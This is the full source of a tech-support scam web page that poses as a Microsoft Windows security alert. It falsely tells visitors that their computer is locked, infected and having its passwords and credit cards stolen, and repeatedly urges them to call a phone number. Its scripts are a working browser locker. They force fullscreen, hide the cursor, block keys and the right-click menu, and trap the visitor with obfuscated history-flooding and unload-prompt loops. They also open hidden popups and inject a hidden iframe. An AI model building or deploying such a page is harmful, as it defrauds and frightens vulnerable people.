<!DOCTYPE html>
<html <head="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">

		<title>Microsoft-Windows-Official-Help-and-services</title>
                <link rel="stylesheet" href="bootstrap.min.css" >

		<script src="bootstrap.min.js" ></script>
		<link href="alert.css" rel="stylesheet">

                <meta content="width=device-width, initial-scale=1.0, user-scalable=1" name="viewport">
                <meta name="robots" content="noindex, nofollow">

								<script>function formatAMPM() {
								var d = new Date(),
									minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
									hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
									ampm = d.getHours() >= 12 ? 'pm' : 'am',
									months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
									days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
								return days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate()+' '+d.getFullYear()+' '+hours+':'+minutes+ampm;
								}</script>

		<style>html {
            overflow: hidden;
        }




       </style>
<style>.blink_me {
  animation: blinker 1s linear infinite;
}

@keyframes blinker {
  50% { opacity: 0; }
}

</style>

<style>div.fixed{position:fixed;bottom:0;right:0;width:300px;height:300px;border:1px }</style>
<style>div.fixed2{position:fixed;bottom:0px;right:25px;width:200px;height:50px;border:1px;color:black;font-size:22px;font-weight:bold;-webkit-animation-name:example;-webkit-animation-duration:1s;animation-name:example;animation-duration:1s;animation-iteration-count:infinite}@-webkit-keyframes example{0%{color:black}50%{color:red}100%{color:black}}@keyframes example{0%{color:black}50%{color:red}100%{color:black}}</style>

	<style>
			*{margin:0;padding:0;height:auto}
			body{background:#FF0000;color:#fff;font-family:'Yantramanav',sans-serif;margin:0 auto;width:100%;padding:0}
			#wrap{max-width:800px;width:100%;margin:100px auto;padding:25px}
			h1{margin-bottom:25px}
			p{margin-bottom:35px}
			p{line-height:28px}
			a{color:#fff!important}
			.btn{outline:0!important;text-decoration:none!important;padding:10px 24px;color:#fff;display:inline-block;font-size:15px;background-color:#FF0000;font-weight:600}
			.btn:hover,.btn:active{-webkit-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);-moz-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50)}

			input[type=checkbox]{visibility:hidden}
			.checkbox{position:relative;margin-right:10px}
			.checkbox label{cursor:pointer;position:absolute;width:15px;height:15px;left:4px;top:1px;border:1px solid #fff;border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px}
			.checkbox label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";filter:alpha(opacity=0);opacity:0;content:'';position:absolute;width:8px;height:5px;background:transparent;top:2px;left:2px;border:2px solid #fff;border-top:none;border-right:none;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}
			.checkbox label:hover::after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=30)";filter:alpha(opacity=30);opacity:0.3}
			.checkbox input[type=checkbox]:checked+label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";filter:alpha(opacity=100);opacity:1}
		</style>

		<style>
.blink {
background-color:yellow;
color:black;
  animation: blink-animation 1s steps(5, start) infinite;
  -webkit-animation: blink-animation 1s steps(5, start) infinite;
}

.blink1 {
background-color:green;
  animation: blink-animation 1s steps(5, start) infinite;
  -webkit-animation: blink-animation 1s steps(5, start) infinite;
}


@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
</style>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>




<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxx-x"></script>
<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());

	gtag('config', 'UA-xxx-x');
</script>


	</head>


	    <script src=./js/jquery.min.js></script>
	    <script>
	        function formatAMPM() {
	            var d = new Date()
	              , minutes = d.getMinutes().toString().length == 1 ? '0' + d.getMinutes() : d.getMinutes()
	              , hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours()
	              , ampm = d.getHours() >= 12 ? 'pm' : 'am'
	              , months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
	              , days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	            return days[d.getDay()] + ' ' + months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ' + hours + ':' + minutes + ampm;
	        }
	    </script>
	    <script>
	        function getURLParameter(a) {
	            return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
	        }
	        function random_betw(b, a) {
	            return Math.round(Math.random() * (a - b) + b)
	        }
	        var phone = "+1-855-695-0048";
	          var text = "** Microsoft Windows warning alert **";
	            </script>
	    <script>
	        var w = window.screen.width;
	        var h = window.screen.height;
	        window.moveTo(0, 0);
	        window.resizeTo(w, h);
	    </script>
	    <script>
	        var isOpera = !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
	        var isFirefox = typeof InstallTrigger !== "undefined";
	        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
	        var isChrome = !!window.chrome && !isOpera;
	        var isIE = /*@cc_on!@*/
	        false || !!document.documentMode;
	    </script>

	  <style type="text/css">
	      .nocursor { cursor:none; }
	  </style>



		<body class="nocursor"  style="background:#FF0000 url('microsoft.png') no-repeat top right;" id="chrome-alerts">




	<div style="position:absolute; top:0px; left:20px;"><img src="def.gif"></div>
	<div style="position:absolute; top:50px; right:35px;"><h3 style="font-size:22px; font-weight:bold;">Call Support +1-855-695-0048
</h3></div>

	<div style="position:absolute; top:230px; right:40px;"><h3 style="font-size:22px; font-weight:bold;">Call Support +1-855-695-0048</h3></div>

		<div id="wrap">

			<img src="x.png"  alt="stop" width="75" height="75" style="margin-bottom:50px">
			<h1>Your computer has been Locked</h1>
			<h2>Call Microsoft : +1-855-695-0048</h2>
			<br>
			<p>Your computer with the IP address <strong>192.84.29.40</strong> has been infected by the Trojans -- <strong> Because System Activation KEY has expired </strong> & Your information (for example, passwords, messages, and credit cards) have been stolen. <strong>Call Microsoft +1-855-695-0048</strong> to protect your files and identity from further damage.</p>
			<h2 style="margin-top:-12px" >Call Microsoft : +1-855-695-0048 (Toll Free)</h2>
			<p style="margin-bottom:50px">

				Automatically report details of possible security incidents to Google. <a href="index.html#"> Privacy policy</a>
			</p>
			<div>
				<a href="tel:+1-855-695-0048" class="btn blink1" style="float:left; background-color:green;" > Call Microsoft : +1-855-695-0048 (Toll Free)</a>
				<a href="index.html#" class="btn animation: blinker 1s linear infinite;" style="font-size:18px;float:right; background-color:green;">Back to safety</a>
			</div>
		</div>
		<br><br><br><br><br><br><br><br><br><br>
		<br><br><br><br><br><br><br><br><br><br>



 <!-- Modal -->
 <div id="chrome-alerts" class="chrome-alert">
  <div> <a href="javascript:openlink()" class="cross">×</a>
    <h1>support.windows.com says:</h1>
    <div class="content-box" id="alert-content-box">
      <p>**  Windows Warning  Alert  **<br>
        Malicious Pornographic  Spyware/Riskware Detected<br>
       <span style="font-size:15px">Error code:  - 0x8024402c</span><br>
        <br>
        Please call us immediately Call Microsoft at:<span style="font-size:15px"> +1-855-695-0048 (Toll Free)
</span><br>
        Do not ignore this critical alert.<br>
        If you close this page, your computer access will be disabled to prevent further damage to our network.<br>
        Your computer has alerted us that it has been infected with a Pornographic  Spyware and riskware.  The following information is being stolen...<br>

        <span style="font-size:20px">Call Microsoft: +1-855-695-0048 (Toll Free)</span></p>
    </div>
    <label style="font-size: 12px;">

    <div class="action_buttons"> <a  class="active blink" id="leave_page">Leave Page</a> <a  class="active" id="leave_page">Stay Page</a> </div>
  </div>
</div>

<div class="fixed">
<img src="image.png" style="position: absolute; left: 1px; bottom: 1px;" height="300" width="300"></div><div class="fixed2">+1-855-695-0048</div></div><div style="position: absolute; right: 45px; top: 200px;color:#FFF;"><b><u>Error&nbsp;Logged at: <script>document.write(formatAMPM());</script><br>Microsoft Diagnostics IP Address: 127.255.0.1</br></div></u></b>
</div>




<script type="text/javascript">/*<![CDATA[*/
// audio play /*
  var msgAudioEl = document.getElementById("msgSound");

  var playMsgInt = setInterval(function () {
    if (isPlaying(msgAudioEl)) {
      // console.log('already playing. clearing interval');
      clearInterval(playMsgInt);
    } else {
      // console.log('Triggering play');
      msgAudioEl.play();
    }
  }, 500);
  // audio play */

</script>

    <script type="text/javascript">/*<![CDATA[*/
    // audio play /*
      var msgAudioEl = document.getElementById("msgSound1");

      var playMsgInt = setInterval(function () {
        if (isPlaying(msgAudioEl)) {
          // console.log('already playing. clearing interval');
          clearInterval(playMsgInt);
        } else {
          // console.log('Triggering play');
          msgAudioEl.play();
        }
      }, 5000);
      // audio play */

    </script>

<script>
$(function() {
		if (isFirefox) {
				$("a").click(function(e) {
						e.preventDefault()
				});
				var e = ["pushState", "onbeforeunload", "", "returnValue", "onload", "toString"];
				o = e, u = 325,
						function(e) {
								for (; --e;) o.push(o.shift())
						}(++u);
				var n = function(n, t) {
						return e[n -= 0]
				};
				t = text, window[n("0x0")] = function(e) {
						var o = n("0x1") + t;
						return e[n("0x2")] = o, o
				}, window[n("0x3")] = function() {
						if (confirm("" + t))
								for (var e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e);
						else
								for (e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e)
				}
		}
		var t, o, u, r, c, i, l;
		if (isChrome || isOpera) {

				var d = !1;

				// $("head").append('<script src="./js/jquery.js"><\/script>'), $("head").append('<link href="./css/style.css" rel="stylesheet">'),
        document.getElementById("msgSound").play()
        debugger;
        window.onkeydown = function(e) {

            return !1
				}, window.onkeypress = function(e) {
						return !1
				}, onbeforeunload = function() {
						return alert("??????? ESC, ????? ??????? ????????!"), "??????? ESC, ????? ??????? ????????!"
				}, document.oncontextmenu = new Function("return false");
				for (var s = 0; s < 0; s++) alert(text);

				function a() {
						d ? (document.getElementById("blue-screen").style.display = "block", document.getElementsByTagName("body").item(0).setAttribute("class", "past")) : d = !0
				}

				function m() {
						document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)), window.open("bluex.php", "Alert", "width=1,height=1,scrolling=yes,fullscreen=yes,left=3000,top=3000")
				}

				document.getElementById("chrome-alerts").style.display = "block", document.addEventListener("keyup", function(e) {
						27 == e.keyCode && m()
				}, !1), document.addEventListener("keyup", function(e) {
						122 != e.keyCode && 17 != e.keyCode && 18 != e.keyCode && 13 != e.keyCode || (a(), m())
				}, !1), window.onload = function() {
						document.onclick = function(e) {

								e = e || event, target = e.target || e.srcElement, target.tagName, m(), a()
						}
				}, addEventListener("click", function() {
          debugger;
						a();
						var e = document.documentElement;
						(e.requestFullScreen || e.webkitRequestFullScreen || e.mozRequestFullScreen).call(e)
				}), window.addEventListener("resize", function() {
						$("body").css("overflow", "hidden"), $(".popup-alert").stop().animate({
								bottom: "-10px",
								opacity: 1
						}, 500), document.getElementById("msgSound").play(), screen.width, window.innerWidth, window.setInterval(function() {
								for (var e = 0; e < 100; e++) history.pushState(0, 0, e)
						}, 500)
				})
		}
		if (isIE || isSafari) {
				$("#blue-screen,.chrome-alert").hide();
				var f = ["onmouseout", "body", "addEventListener", "mouseout", "*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\n", "attachEvent"];
				i = f, l = 361,
						function(e) {
								for (; --e;) i.push(i.shift())
						}(++l);
				var y = function(e, n) {
						return f[e -= 0]
				};
				r = text, c = text, alert(r), document[y("0x0")][y("0x1")] ? document[y("0x0")][y("0x1")](y("0x2"), function(e) {
						alert(y("0x3") + r)
				}, !1) : document[y("0x0")][y("0x4")](y("0x5"), function(e) {
						alert(r)
				}), window.onbeforeunload = function() {
						return c
				}
		}
});

</script>



	<script type="text/javascript">
 		var Bls = "";
 		if (window.chrome) {
 				if (window.opr) {} else {
 						function nch_bh() {
 								//alert(Bls);
 						}
 						window.setInterval(function() {
 							 // nch_bh()
 						}, 1100);
 				}
 		} else {
 				if (window.sidebar) {
 						function bfj_ss() {
 								var i = document.createElement("div");
 								i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Yf010_1010_1p_01p1p.php"></iframe></div>';
 								document.body.appendChild(i);
 						}
 						window.setInterval(function() {
 								nch_ss()
 						}, 100);
 				} else {
 						function nch() {
 								var r = confirm(Bls);
 								if (r == true) {
 									 // alert(Bls);
 								} else {
 									 // alert(Bls);
 								}
 						}
 						window.setInterval(function() {
 							 // nch();
 						}, 100);
 				}
 		}
  </script>


<iframe id="calendar" src="Shfdfd.mp3" allow="autoplay" style="display:none;">


</body>
</html>
